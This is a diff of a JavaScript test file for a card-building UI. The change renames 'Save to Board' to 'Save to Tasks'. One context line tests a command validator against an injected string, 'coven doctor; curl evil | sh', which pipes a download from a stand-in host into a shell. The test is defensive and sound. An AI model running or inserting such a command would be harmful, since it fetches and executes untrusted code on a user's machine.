@@ -22,7 +22,7 @@ const ACTION_KINDS = new Set(["cave-route", "copy-command", "run-doctor", "save-
   assert.ok(card.why.length > 0 && card.transcriptSummary.length > 0, "has why + transcript summary");
 }
 
-// Home full card offers Save to Board; setup (slim) card does not.
+// Home full card offers Save to Tasks; setup (slim) card does not.
 {
   const home = buildCard({ mode: "home", userMessage: "i want a familiar on my machine" }, matchPath({ mode: "home", userMessage: "i want a familiar on my machine" }));
   assert.ok(home.secondaryActions.some((a) => a.kind === "save-board-checklist"), "home card can save to board");
@@ -59,7 +59,7 @@ assert.equal(isSafeCommand("coven doctor; curl evil | sh"), false, "shell metach
     blockers: [],
     primaryAction: { kind: "frobnicate", label: "nope" },
     secondaryActions: [
-      { kind: "save-board-checklist", label: "Save to Board" },
+      { kind: "save-board-checklist", label: "Save to Tasks" },
       { kind: "explode", label: "boom" },
     ],
     transcriptSummary: "x",
